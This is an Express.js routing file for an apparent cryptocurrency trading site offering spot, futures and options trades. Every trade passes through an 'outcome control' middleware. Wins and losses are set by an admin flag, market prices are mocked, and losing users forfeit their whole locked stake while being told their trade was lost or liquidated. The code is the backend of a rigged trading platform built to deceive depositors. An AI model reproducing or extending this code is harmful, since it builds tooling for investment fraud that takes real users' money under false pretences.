/**
 * Trading Routes
 * Handles all trade execution with outcome control
 */

import express from 'express';
import { authenticateUser } from '../middleware/auth.js';
import TradeOutcomeMiddleware from '../middleware/tradeOutcomeMiddleware.js';
import { tradingService } from '../../src/services/tradingService.js';
import { walletService } from '../../src/services/wallet-service-new.js';

const router = express.Router();
const tradeMiddleware = new TradeOutcomeMiddleware();

// Options profit percentages by duration (in seconds) - Based on UI requirements
const OPTIONS_PROFIT_RATES = {
  60: 115,   // 15% profit for 60s (100 + 15)
  120: 118,  // 18% profit for 120s (100 + 18)  
  240: 122,  // 22% profit for 240s (100 + 22)
  360: 125,  // 25% profit for 360s (100 + 25)
  600: 130   // 30% profit for 600s (estimated based on pattern)
};

// Apply trade outcome control to all trading routes
router.use(tradeMiddleware.enforceComplete());

/**
 * POST /api/trading/spot
 * Execute a spot trade
 */
router.post('/spot', authenticateUser, async (req, res) => {
  try {
    const { pair, side, type, amount, price, total } = req.body;
    const userId = req.user.id;

    // Validate required fields
    if (!pair || !side || !type || !amount || !total) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields'
      });
    }

    // Calculate order price
    const orderPrice = type === 'market' ? req.mockPrice || 67000 : price;

    // Create the order
    const order = await tradingService.createSpotOrder({
      userId,
      pair,
      side,
      type,
      amount: parseFloat(amount),
      price: orderPrice,
      total: parseFloat(total),
      metadata: {
        shouldWin: req.shouldWin,
        outcome: req.shouldWin ? 'win' : 'loss',
        timestamp: Date.now()
      }
    });

    // Lock balance first
    await walletService.lockBalance({
      userId,
      asset: 'USDT',
      amount: parseFloat(total),
      reference: `spot-order-${order.id}`
    });

    // Determine outcome based on admin control
    const wins = req.shouldWin;
    const profit = wins ? parseFloat(total) * 0.05 : -parseFloat(total);

    // Update wallet based on outcome
    if (wins) {
      await walletService.addBalance({
        userId,
        asset: 'USDT',
        amount: parseFloat(total) + profit,
        reference: order.id,
        type: 'trade_settlement'
      });
    }

    // Return response with enforced outcome
    res.json({
      success: true,
      trade: {
        id: order.id,
        pair,
        side,
        type,
        amount: parseFloat(amount),
        price: orderPrice,
        total: parseFloat(total),
        status: 'completed',
        outcome: wins ? 'win' : 'loss',
        pnl: profit,
        message: wins ? 'Trade completed successfully' : 'Trade resulted in loss',
        metadata: {
          shouldWin: wins,
          timestamp: Date.now()
        }
      }
    });

  } catch (error) {
    console.error('Spot trade error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to execute spot trade',
      details: error.message
    });
  }
});

/**
 * POST /api/trading/futures
 * Execute a futures trade
 */
router.post('/futures', authenticateUser, async (req, res) => {
  try {
    const { pair, side, positionType, orderType, amount, price, leverage, margin } = req.body;
    const userId = req.user.id;

    // Validate required fields
    if (!pair || !side || !positionType || !orderType || !amount || !leverage || !margin) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields'
      });
    }

    const orderPrice = orderType === 'market' ? req.mockPrice || 67000 : price;

    // Create futures position
    const position = await tradingService.openFuturesPosition({
      userId,
      pair,
      side,
      type: positionType,
      orderType,
      amount: parseFloat(amount),
      price: orderPrice,
      leverage: parseInt(leverage),
      margin: parseFloat(margin),
      metadata: {
        shouldWin: req.shouldWin,
        outcome: req.shouldWin ? 'win' : 'loss'
      }
    });

    // Lock margin
    await walletService.lockBalance({
      userId,
      asset: 'USDT',
      amount: parseFloat(margin),
      reference: `futures-position-${position.id}`,
      type: 'margin_lock'
    });

    // Determine outcome
    const wins = req.shouldWin;
    const pnl = wins ? parseFloat(margin) * 0.2 : -parseFloat(margin);

    // Update wallet if winning trade
    if (wins) {
      await walletService.addBalance({
        userId,
        asset: 'USDT',
        amount: parseFloat(margin) + pnl,
        reference: position.id,
        type: 'futures_settlement'
      });
    }

    res.json({
      success: true,
      trade: {
        id: position.id,
        pair,
        side,
        type: positionType,
        amount: parseFloat(amount),
        price: orderPrice,
        leverage: parseInt(leverage),
        margin: parseFloat(margin),
        status: 'completed',
        outcome: wins ? 'win' : 'loss',
        pnl,
        message: wins ? 'Position profitable' : 'Position liquidated',
        metadata: {
          shouldWin: wins,
          timestamp: Date.now()
        }
      }
    });

  } catch (error) {
    console.error('Futures trade error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to execute futures trade',
      details: error.message
    });
  }
});

/**
 * POST /api/trading/options
 * Execute an options trade
 */
router.post('/options', authenticateUser, async (req, res) => {
  try {
    const { pair, direction, amount, timeFrame, payout } = req.body;
    const userId = req.user.id;

    // Validate required fields
    if (!pair || !direction || !amount || !timeFrame) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields'
      });
    }

    const parsedAmount = parseFloat(amount);
    const parsedTimeFrame = parseInt(timeFrame);

    // Calculate correct profit based on timeFrame
    const profitRate = OPTIONS_PROFIT_RATES[parsedTimeFrame] || 115;
    const profitPercentage = profitRate - 100; // Actual profit percentage
    const actualPayout = req.shouldWin ? parsedAmount * (profitRate / 100) : 0;
    const profit = req.shouldWin ? actualPayout - parsedAmount : -parsedAmount;

    console.log(`💰 Options profit calculation:`, {
      timeFrame: parsedTimeFrame,
      profitRate,
      profitPercentage,
      amount: parsedAmount,
      actualPayout,
      profit,
      shouldWin: req.shouldWin
    });

    // Create option
    const option = await tradingService.createOption({
      userId,
      pair,
      direction,
      amount: parsedAmount,
      timeFrame: parsedTimeFrame,
      payout: actualPayout,
      expiresAt: Date.now() + (parsedTimeFrame * 1000),
      metadata: {
        shouldWin: req.shouldWin,
        outcome: req.shouldWin ? 'win' : 'loss',
        profitRate,
        profitPercentage,
        timestamp: Date.now()
      }
    });

    // Lock premium
    await walletService.lockBalance({
      userId,
      asset: 'USDT',
      amount: parsedAmount,
      reference: `option-${option.id}`,
      type: 'option_premium'
    });

    // Update wallet if winning trade
    if (req.shouldWin) {
      await walletService.addBalance({
        userId,
        asset: 'USDT',
        amount: actualPayout,
        reference: option.id,
        type: 'option_settlement'
      });
    }

    res.json({
      success: true,
      trade: {
        id: option.id,
        pair,
        direction,
        amount: parsedAmount,
        timeFrame: parsedTimeFrame,
        payout: actualPayout,
        expiresAt: Date.now() + (parsedTimeFrame * 1000),
        status: 'completed',
        outcome: req.shouldWin ? 'win' : 'loss',
        pnl: profit,
        message: req.shouldWin ? `Option won! +${profitPercentage}% profit` : 'Option lost',
        metadata: {
          shouldWin: req.shouldWin,
          profitRate,
          profitPercentage,
          timestamp: Date.now()
        }
      }
    });

  } catch (error) {
    console.error('Options trade error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to execute options trade',
      details: error.message
    });
  }
});

/**
 * GET /api/trading/history
 * Get user's trading history
 */
router.get('/history', authenticateUser, async (req, res) => {
  try {
    const userId = req.user.id;
    const transactions = await tradingService.getUserTransactions(userId);
    
    res.json({
      success: true,
      history: transactions
    });
  } catch (error) {
    console.error('History error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch trading history'
    });
  }
});

export default router;
